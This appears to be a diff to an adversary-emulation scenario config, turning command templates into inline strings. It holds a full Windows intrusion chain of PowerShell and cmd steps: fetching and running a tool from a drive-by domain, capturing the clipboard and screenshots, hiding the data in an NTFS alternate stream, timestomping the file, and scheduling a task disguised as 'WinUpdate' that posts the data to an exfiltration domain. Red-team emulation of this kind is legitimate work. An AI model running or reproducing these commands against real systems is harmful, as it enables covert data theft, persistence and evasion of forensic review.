@@ -128,19 +128,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{invoke-webrequest http://",
-                            "self.driveby_domain2",
-                            "/",
-                            "self.tool_name2",
-                            " -O ",
-                            "self.temp_dir_name",
-                            "\\",
-                            "self.tool_name2",
-                            "; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{invoke-webrequest http://${self.driveby_domain2}/${self.tool_name2} -O ${self.temp_dir_name}\\${self.tool_name2}; echo \" \"}"
                 }
             }
         },
@@ -153,15 +141,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd /c wscript ",
-                            "self.temp_dir_name",
-                            "\\",
-                            "self.tool_name2",
-                            " && echo \" \""
-                        ]
-                    }
+                    "command": "cmd /c wscript ${self.temp_dir_name}\\${self.tool_name2} && echo \" \""
                 }
             }
         },
@@ -174,13 +154,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell Get-Clipboard >> ",
-                            "self.temp_dir_name",
-                            "\\license.rtf; echo \" \""
-                        ]
-                    }
+                    "command": "powershell Get-Clipboard >> ${self.temp_dir_name}\\license.rtf; echo \" \""
                 }
             }
         },
@@ -193,13 +167,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "cmd /c attrib +H ",
-                            "self.temp_dir_name",
-                            "\\license.rtf && echo \" \""
-                        ]
-                    }
+                    "command": "cmd /c attrib +H ${self.temp_dir_name}\\license.rtf && echo \" \""
                 }
             }
         },
@@ -212,13 +180,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell $a = quser; $b = Out-String -inputobject $a; $c = $b.split(\"`n>\")[2].split()[0]; $d = \"",
-                            "self.temp_dir_name",
-                            "/~temp482\"; [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.windows.forms.sendkeys]::sendwait(\"{PRTSC}\"); $e = [System.Windows.Forms.Clipboard]::GetDataObject(); [System.Drawing.Bitmap]$e.getimage().Save($d, [System.Drawing.Imaging.ImageFormat]::Jpeg); echo \" \""
-                        ]
-                    }
+                    "command": "powershell $a = quser; $b = Out-String -inputobject $a; $c = $b.split(\"`n>\")[2].split()[0]; $d = \"${self.temp_dir_name}/~temp482\"; [void][reflection.assembly]::loadwithpartialname('system.windows.forms'); [system.windows.forms.sendkeys]::sendwait(\"{PRTSC}\"); $e = [System.Windows.Forms.Clipboard]::GetDataObject(); [System.Drawing.Bitmap]$e.getimage().Save($d, [System.Drawing.Imaging.ImageFormat]::Jpeg); echo \" \""
                 }
             }
         },
@@ -231,15 +193,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell $data = [convert]::ToBase64String((Get-Content ",
-                            "self.temp_dir_name",
-                            "\\~temp482 -Encoding byte)); Set-Content ",
-                            "self.temp_dir_name",
-                            "\\license.rtf -Stream \"hidden\" -value $data; echo \" \""
-                        ]
-                    }
+                    "command": "powershell $data = [convert]::ToBase64String((Get-Content ${self.temp_dir_name}\\~temp482 -Encoding byte)); Set-Content ${self.temp_dir_name}\\license.rtf -Stream \"hidden\" -value $data; echo \" \""
                 }
             }
         },
@@ -252,13 +206,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden ",
-                            "self.temp_dir_name",
-                            "\\license.rtf; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
-                        ]
-                    }
+                    "command": "powershell &{$NewDate = (Get-Date '01/01/1969 01:01am'); $TSFile = gci -hidden ${self.temp_dir_name}\\license.rtf; $TSFile.LastWriteTime = $NewDate; $TSFile.CreationTime = $NewDate; $TSFile.LastAccessTime = $NewDate; echo \" \"}"
                 }
             }
         },
@@ -271,15 +219,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell $time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); SchTasks.exe /Create /SC ONCE /TN \"WinUpdate\", /TR \"powershell Invoke-RestMethod -Uri http://",
-                            "self.exfil_domain",
-                            " -Method Post -InFile ",
-                            "self.temp_dir_name",
-                            "\\license.rtf\" /ST $hourMinute /F; echo \" \""
-                        ]
-                    }
+                    "command": "powershell $time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); SchTasks.exe /Create /SC ONCE /TN \"WinUpdate\", /TR \"powershell Invoke-RestMethod -Uri http://${self.exfil_domain} -Method Post -InFile ${self.temp_dir_name}\\license.rtf\" /ST $hourMinute /F; echo \" \""
                 }
             }
         },
